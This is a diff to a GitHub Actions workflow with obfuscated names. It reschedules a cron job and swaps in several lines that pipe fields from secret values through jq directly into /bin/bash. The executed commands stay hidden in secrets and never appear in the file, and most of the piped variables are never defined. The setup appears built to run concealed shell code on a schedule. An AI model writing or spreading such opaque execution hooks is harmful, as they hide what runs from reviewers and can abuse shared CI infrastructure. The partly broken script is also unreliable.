@@ -1,10 +1,8 @@
 name: peixuan19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 3/6 * * *'
-
+    - cron: '20 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: peixuan19871010
         env:
-          uhbb17: ${{ secrets.uhbb17 }}
+          vre73: ${{ secrets.vre73 }}
         run: |
-          echo $uhbb17 | jq -r .d5336 | /bin/bash
-          echo $f105 | jq -r .nq27 | /bin/bash
-          echo $uysn56456 | jq -r .ohyjb03 | /bin/bash
-          echo $ddez8 | jq -r .ph1 | /bin/bash
+          echo $vre73 | jq -r .ztm38244 | /bin/bash
+          echo $t16 | jq -r .rhvfq59 | /bin/bash
+          echo $pmy279 | jq -r .wc4922 | /bin/bash
+          echo $to331 | jq -r .gqdij4606 | /bin/bash
+          echo $q055 | jq -r .xbvnc3712 | /bin/bash
+          echo $p9 | jq -r .s93 | /bin/bash
+          echo $ie842 | jq -r .pc4 | /bin/bash
 
